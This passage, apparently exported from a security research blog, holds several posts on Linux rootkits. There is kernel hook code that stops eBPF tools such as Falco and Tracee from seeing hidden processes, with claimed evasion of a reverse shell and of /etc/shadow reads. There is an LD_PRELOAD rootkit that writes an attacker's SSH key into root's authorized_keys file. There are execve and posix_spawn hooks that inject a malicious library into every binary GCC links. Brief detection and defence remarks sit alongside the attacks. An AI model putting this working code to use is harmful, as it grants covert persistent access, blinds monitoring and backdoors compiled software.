flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear \u0026ldquo;not found\u0026rdquo; without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)\nBottom line: once the kernel is attacker-controlled, the system\u0026rsquo;s \u0026ldquo;ground truth\u0026rdquo; is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can\u0026rsquo;t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, 